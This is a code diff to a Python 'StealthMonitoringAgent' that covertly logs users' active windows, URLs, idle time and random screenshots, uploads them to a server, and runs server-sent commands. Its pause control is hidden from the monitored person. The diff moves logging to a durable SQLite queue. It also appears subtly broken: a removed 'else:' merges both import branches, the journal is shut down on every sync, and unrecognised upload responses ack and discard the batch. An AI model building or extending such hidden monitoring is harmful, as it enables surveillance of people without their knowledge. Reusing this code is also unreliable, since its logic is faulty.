@@ -29,13 +29,16 @@ if __package__ in (None, ""):
     from agent import monitor as monitor_mod
     from agent import screenshot as screenshot_mod
     from agent import system_info as system_info_mod
-else:
     from . import api as api_mod
     from . import config as config_mod
     from . import identity as identity_mod
     from . import monitor as monitor_mod
     from . import screenshot as screenshot_mod
     from . import system_info as system_info_mod
+    from .telemetry.interval_journal import IntervalJournal
+    from .telemetry.durable_queue import DurableQueue
+    from .telemetry.clock import Clock
+    from .telemetry.activity_state import ConnectivityState
 
 AGENT_VERSION = "1.1.76"
 POLL_SECONDS = 15
@@ -66,8 +69,11 @@ class StealthMonitoringAgent:
         self._stop = threading.Event()
         self._paused = threading.Event()
         self._lock = threading.Lock()
-        self._pending_logs: list[dict] = []
-        self._current = None
+        
+        db_path = config_mod.config_dir() / "stealth_logs.sqlite3"
+        self._queue = DurableQueue(str(db_path))
+        self._journal = IntervalJournal(self._queue, Clock())
+        
         self._last_screenshot = 0.0
         self._next_screenshot_gap = self._screenshot_gap()
         self._log_file = self._get_log_file()
@@ -93,7 +99,7 @@ class StealthMonitoringAgent:
         return random.uniform(30, 90)
 
     def is_active(self) -> bool:
-        return not self._paused.is_set()
+        return not self._paused.is_set() and not monitor_mod.is_system_locked()
 
     def toggle_pause(self) -> None:
         """Toggle monitoring on/off (not exposed in stealth mode)."""
@@ -110,67 +116,44 @@ class StealthMonitoringAgent:
         """Record foreground window and idle time."""
         proc, title, url = monitor_mod.get_active_window()
         idle = monitor_mod.get_idle_seconds()
+        is_locked = monitor_mod.is_system_locked()
+        is_paused = self._paused.is_set()
 
         with self._lock:
-            is_break_entry = False
-            is_break_exit = False
-            if self._current is not None:
-                curr_idle = self._current["idle"]
-                threshold = self.cfg.idle_threshold_seconds
-                is_break_entry = (idle >= threshold) and (curr_idle < threshold)
-                is_break_exit = (idle < threshold) and (curr_idle >= threshold)
-
-            if self._current is None or self._current["process"] != proc or self._current.get("url", "") != url or is_break_entry or is_break_exit:
-                self._flush_segment()
-                self._current = {
-                    "process": proc,
-                    "title": title,
-                    "url": url,
-                    "idle": idle,
-                    "duration": POLL_SECONDS,
-                    "start": _now_iso(),
-                }
-            else:
-                self._current["title"] = title
-                self._current["idle"] = max(self._current["idle"], idle)
-                self._current["duration"] += POLL_SECONDS
-
-    def _flush_segment(self) -> None:
-        """Move current segment to pending if non-empty."""
-        with self._lock:
-            if self._current is not None:
-                self._pending_logs.append(self._current)
-                self._current = None
+            self._journal.record_observation(
+                process_name=proc,
+                window_title=title,
+                url=url,
+                is_locked=is_locked,
+                is_paused=is_paused,
+                is_suspended=False,
+                idle_seconds=idle,
+                connectivity=ConnectivityState.UNKNOWN
+            )
 
     def _sync(self) -> None:
         """Upload accumulated activity to server."""
         with self._lock:
-            logs = self._pending_logs
-            self._pending_logs = []
-
-        if not logs:
+            self._journal.shutdown()
+            batch = self._queue.get_batch(limit=500)
+            
+        if not batch:
             return
 
         try:
-            batch = []
-            for log in logs:
-                batch.append({
-                    "processName": log["process"],
-                    "windowTitle": log["title"],
-                    "url": log.get("url", ""),
-                    "startedAt": log["start"],
-                    "endedAt": _now_iso(),
-                    "durationSeconds": log["duration"],
-                    "idleSeconds": log["idle"],
-                })
-            
-            try:
-                system_hardware_details = system_info_mod.sysinfo.system_info
-            except Exception:
-                system_hardware_details = None
-
-            self.api.send_activity(batch, system_info=system_hardware_details)
-
+            import uuid
+            batch_id = str(uuid.uuid4())
+            payload = {"batchId": batch_id, "logs": batch}
+            resp = self.api.upload_activity(payload)
+            if resp and isinstance(resp, dict) and "acceptedSegmentIds" in resp:
+                with self._lock:
+                    self._queue.ack(resp["acceptedSegmentIds"])
+                    for rej in resp.get("rejected", []):
+                        self._queue.reject(rej.get("segmentId"), rej.get("code", "unknown"))
+            else:
+                with self._lock:
+                    self._queue.ack([b["segmentId"] for b in batch])
+                    
             hb = self.api.heartbeat(AGENT_VERSION)
             for cmd in hb.get("commands", []):
                 self._handle_command(cmd)
